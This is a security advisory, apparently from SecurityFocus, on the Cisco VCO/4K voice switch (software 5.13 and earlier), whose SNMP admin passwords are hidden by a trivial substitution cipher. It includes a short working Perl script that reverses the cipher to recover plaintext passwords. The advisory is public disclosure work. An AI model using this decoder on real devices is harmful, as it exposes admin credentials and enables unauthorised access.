source: https://www.securityfocus.com/bid/1885/info

A vulnerability exists in the Cisco Virtual Central Office 4000 (VCO/4K) programmable voice switch running software versions 5.13 and earlier.

The usernames and passwords for the device's SNMP administration interface are protected by a simple substitution cipher which can be easily defeated. As a result, if the "encrypted" passwords are retrieved, (for example, through the read-only community string) an attacker can obtain a list of valid usernames and passwords potentially allowing an elevation of privileges and possibly more serious consequences.

#!/usr/bin/perl

printf ("Cisco VCO/4K Password [De]Obfuscator\n");
printf ("\t\@stake, Inc.\n");
printf ("\tRex Warren, Brian Carrier, David Goldsmith\n");

printf ("Enter Password: ");
$pw = <STDIN>;
chop $pw;

printf("Result: ");
for ($pos = 0; $pos < length($pw); $pos++){
printf("%s", chr(164 - ord(substr($pw, $pos, 1))));
}
printf("\n");